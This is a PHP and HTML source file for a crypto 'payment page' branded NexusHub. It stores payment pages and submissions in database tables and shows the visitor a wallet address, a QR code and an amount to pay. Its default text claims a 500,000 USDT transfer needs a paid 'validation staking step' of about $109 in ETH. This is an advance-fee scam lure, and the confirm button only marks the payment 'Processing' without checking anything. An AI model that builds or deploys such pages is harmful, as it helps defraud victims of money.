<?php
include 'config.php';

// Auto-create tables if they don't exist
$conn->query("CREATE TABLE IF NOT EXISTS special_payment_pages (
    id INT AUTO_INCREMENT PRIMARY KEY,
    code VARCHAR(64) NOT NULL UNIQUE,
    token_symbol VARCHAR(20) NOT NULL DEFAULT 'USDT',
    title VARCHAR(255) NOT NULL,
    description TEXT,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$conn->query("CREATE TABLE IF NOT EXISTS special_payments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    page_id INT NOT NULL,
    code VARCHAR(64) NOT NULL,
    token_symbol VARCHAR(20) NOT NULL,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    status VARCHAR(50) DEFAULT 'Processing',
    user_note TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// Handle payment confirmation submit
$submitted = false;
$error_msg = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'complete_payment') {
    $page_id = intval($_POST['page_id'] ?? 0);
    $code = filter($_POST['code'] ?? '');
    $token_symbol = filter($_POST['token_symbol'] ?? '');
    $from_address = filter($_POST['from_address'] ?? '');
    $to_address = filter($_POST['to_address'] ?? '');
    $crypto_amount = filter($_POST['crypto_amount'] ?? '');
    $usd_amount = filter($_POST['usd_amount'] ?? '');

    $stmt = $conn->prepare("INSERT INTO special_payments (page_id, code, token_symbol, from_address, to_address, crypto_amount, usd_amount, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'Processing')");
    if ($stmt) {
        $stmt->bind_param("issssss", $page_id, $code, $token_symbol, $from_address, $to_address, $crypto_amount, $usd_amount);
        if ($stmt->execute()) {
            $submitted = true;
        } else {
            $error_msg = $conn->error;
        }
    }
}

// Get requested payment page
$code = filter($_GET['code'] ?? '');
$page = null;

if ($code) {
    if (method_exists($conn, 'prepare')) {
        $stmt = $conn->prepare("SELECT * FROM special_payment_pages WHERE code = ?");
        if ($stmt) {
            $stmt->bind_param("s", $code);
            $stmt->execute();
            $res = $stmt->get_result();
            if ($res && isset($res->num_rows) && $res->num_rows > 0) {
                $page = $res->fetch_assoc();
            }
        }
    } else if (method_exists($conn, 'query')) {
        $clean_code = filter($code);
        $res = $conn->query("SELECT * FROM special_payment_pages WHERE code = '$clean_code'");
        if ($res && isset($res->num_rows) && $res->num_rows > 0) {
            $page = $res->fetch_assoc();
        }
    }
}

// Default fallback data if no code or not found
if (!$page) {
    $page = [
        'id' => 0,
        'code' => 'default',
        'token_symbol' => 'USDT',
        'title' => 'Complete Your USDT Transfer',
        'description' => 'To complete your 500,000.00 USDT transfer, a validation staking step is required to verify and authorize the transaction. Please complete the requested validation carefully so the transfer can proceed successfully.',
        'from_address' => '0x4bea2d3B8Ecb9b283350Db91dcC540C3e9C8be62',
        'to_address' => '0x80977C960b2E7F656acCA155D9d0bA445B87919b',
        'crypto_amount' => '0.04344239 ETH',
        'usd_amount' => '≈ $109.57 USD'
    ];
}

// Real crypto icon logos
$token_symbol = strtoupper(trim($page['token_symbol']));
$crypto_logo_map = [
    'USDT' => 'https://cryptologos.cc/logos/tether-usdt-logo.png',
    'BTC'  => 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
    'ETH'  => 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
    'BNB'  => 'https://cryptologos.cc/logos/bnb-bnb-logo.png',
    'SOL'  => 'https://cryptologos.cc/logos/solana-sol-logo.png',
    'USDC' => 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png',
    'XRP'  => 'https://cryptologos.cc/logos/xrp-xrp-logo.png',
    'TRX'  => 'https://cryptologos.cc/logos/tron-trx-logo.png',
    'ADA'  => 'https://cryptologos.cc/logos/cardano-ada-logo.png',
    'DOGE' => 'https://cryptologos.cc/logos/dogecoin-doge-logo.png'
];
$logo_url = $crypto_logo_map[$token_symbol] ?? 'https://cryptologos.cc/logos/tether-usdt-logo.png';
$symbol_svg = '<div style="width:84px; height:84px; margin:0 auto;" class="flex items-center justify-center p-2.5 rounded-full bg-white border-2 border-slate-100 shadow-xl"><img src="' . $logo_url . '" alt="' . htmlspecialchars($token_symbol) . '" style="max-width:100%; max-height:100%; object-fit:contain;" onerror="this.onerror=null; this.src=\'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/' . strtolower($token_symbol) . '.png\';"></div>';

$qr_data = urlencode($page['to_address']);
$qr_code_url = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" . $qr_data;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($page['title']); ?> - NexusHub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Syne:wght@700;800&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #6a67ce;
            background-image: linear-gradient(135deg, #7c77e6 0%, #5d59c6 100%);
            font-family: 'DM Sans', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 2rem 1rem;
        }
        .pay-card {
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            max-width: 520px;
            width: 100%;
            padding: 2.5rem 2.25rem;
            text-align: center;
            position: relative;
        }
        .address-box {
            background: #f4f5fa;
            border-radius: 18px;
            padding: 1.25rem;
            text-align: left;
            margin: 1.5rem 0;
            border: 2px solid #eaecf5;
        }
        .amount-box {
            background: #f9fafb;
            border-radius: 20px;
            border: 2px solid #f0f2f7;
            padding: 1.5rem 1rem;
            margin-bottom: 2rem;
        }
        .btn-pay {
            background: linear-gradient(135deg, #6c63ff 0%, #5b52e0 100%);
            color: white;
            font-size: 1.15rem;
            font-weight: 700;
            padding: 1rem 2rem;
            border-radius: 16px;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(108, 99, 255, 0.3);
        }
        .btn-pay:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 28px rgba(108, 99, 255, 0.4);
        }
        /* Modal Overlay */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
            padding: 1rem;
        }
        .modal-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }
        .modal-card {
            background: #ffffff;
            border-radius: 28px;
            max-width: 460px;
            width: 100%;
            padding: 2rem 1.75rem;
            text-align: center;
            position: relative;
            transform: translateY(20px);
            transition: transform 0.3s ease;
        }
        .modal-overlay.active .modal-card {
            transform: translateY(0);
        }
    </style>
</head>
<body>

<div class="pay-card">
    <div class="mb-5 flex justify-center">
        <?php echo $symbol_svg; ?>
    </div>

    <h1 class="text-3xl font-extrabold text-slate-900 tracking-tight mb-3">
        <?php echo htmlspecialchars($page['title']); ?>
    </h1>

    <p class="text-slate-500 text-sm leading-relaxed px-2 mb-6">
        <?php echo htmlspecialchars($page['description']); ?>
    </p>

    <div class="address-box">
        <?php if (!empty($page['from_address'])): ?>
            <div class="mb-3">
                <span class="text-[11px] font-extrabold tracking-wider text-slate-400 uppercase block mb-1">FROM</span>
                <p class="text-xs font-mono text-slate-700 break-all leading-snug"><?php echo htmlspecialchars($page['from_address']); ?></p>
            </div>
            <div class="border-b border-slate-200 my-2"></div>
        <?php endif; ?>
        <div>
            <span class="text-[11px] font-extrabold tracking-wider text-slate-400 uppercase block mb-1">TO</span>
            <p class="text-xs font-mono text-slate-700 break-all leading-snug"><?php echo htmlspecialchars($page['to_address']); ?></p>
        </div>
    </div>

    <div class="amount-box">
        <span class="text-[11px] font-extrabold tracking-wider text-slate-400 uppercase block mb-1">PAYMENT AMOUNT</span>
        <div class="text-3xl sm:text-4xl font-black text-slate-900 tracking-tight my-1">
            <?php echo htmlspecialchars($page['crypto_amount']); ?>
        </div>
        <div class="text-sm font-semibold text-indigo-500">
            <?php echo htmlspecialchars($page['usd_amount']); ?>
        </div>
    </div>

    <button type="button" onclick="openQrModal()" class="btn-pay">
        Pay Now
    </button>
</div>

<!-- QR Code Modal -->
<div id="qr-modal" class="modal-overlay <?php if ($submitted) echo 'active'; ?>">
    <div class="modal-card">
        <button type="button" onclick="closeQrModal()" class="absolute top-5 right-5 text-slate-400 hover:text-slate-600 text-xl focus:outline-none">
            <i class="fas fa-times"></i>
        </button>

        <?php if ($submitted): ?>
            <div class="py-6">
                <div class="w-20 h-20 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center text-4xl mx-auto mb-4">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h3 class="text-2xl font-black text-slate-900 mb-2">Payment Sent for Processing</h3>
                <p class="text-slate-600 text-sm mb-6 leading-relaxed">
                    Your transaction details have been submitted and are currently being processed by our system. Please check back shortly.
                </p>
                <button type="button" onclick="closeQrModal()" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3.5 rounded-xl transition">
                    Done
                </button>
            </div>
        <?php else: ?>
            <h3 class="text-2xl font-black text-slate-900 mb-1">Scan to Pay</h3>
            <p class="text-slate-500 text-xs mb-5">Use your crypto wallet to complete the payment</p>

            <div class="bg-slate-50 border-2 border-slate-100 p-4 rounded-2xl inline-block mb-5">
                <img src="<?php echo $qr_code_url; ?>" alt="Scan QR Code" class="w-56 h-56 mx-auto rounded-lg">
            </div>

            <div class="bg-slate-50 border-2 border-slate-100 rounded-2xl p-4 text-left mb-5">
                <span class="text-[10px] font-extrabold tracking-wider text-slate-400 uppercase block mb-1">WALLET ADDRESS</span>
                <div class="bg-white border border-slate-200 rounded-xl p-3 text-xs font-mono text-slate-800 break-all mb-3" id="wallet-addr">
                    <?php echo htmlspecialchars($page['to_address']); ?>
                </div>
                <button type="button" onclick="copyAddress()" id="copy-btn" class="w-full bg-indigo-500 hover:bg-indigo-600 text-white font-bold py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
                    <i class="fas fa-copy"></i> <span id="copy-text">Copy Address</span>
                </button>
            </div>

            <form method="POST" action="">
                <input type="hidden" name="action" value="complete_payment">
                <input type="hidden" name="page_id" value="<?php echo $page['id']; ?>">
                <input type="hidden" name="code" value="<?php echo htmlspecialchars($page['code']); ?>">
                <input type="hidden" name="token_symbol" value="<?php echo htmlspecialchars($page['token_symbol']); ?>">
                <input type="hidden" name="from_address" value="<?php echo htmlspecialchars($page['from_address']); ?>">
                <input type="hidden" name="to_address" value="<?php echo htmlspecialchars($page['to_address']); ?>">
                <input type="hidden" name="crypto_amount" value="<?php echo htmlspecialchars($page['crypto_amount']); ?>">
                <input type="hidden" name="usd_amount" value="<?php echo htmlspecialchars($page['usd_amount']); ?>">

                <div class="grid grid-cols-2 gap-3">
                    <button type="button" onclick="closeQrModal()" class="w-full bg-white border-2 border-slate-200 text-slate-700 font-bold py-3 rounded-xl hover:bg-slate-50 transition text-sm">
                        Close
                    </button>
                    <button type="submit" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3 rounded-xl transition shadow-lg shadow-emerald-500/20 text-sm">
                        Confirm
                    </button>
                </div>
            </form>
        <?php endif; ?>
    </div>
</div>

<script>
function openQrModal() {
    document.getElementById('qr-modal').classList.add('active');
}

function closeQrModal() {
    document.getElementById('qr-modal').classList.remove('active');
}

function copyAddress() {
    const addr = document.getElementById('wallet-addr').innerText.trim();
    navigator.clipboard.writeText(addr).then(() => {
        const copyText = document.getElementById('copy-text');
        copyText.textContent = 'Copied!';
        setTimeout(() => {
            copyText.textContent = 'Copy Address';
        }, 2000);
    });
}
</script>

</body>
</html>
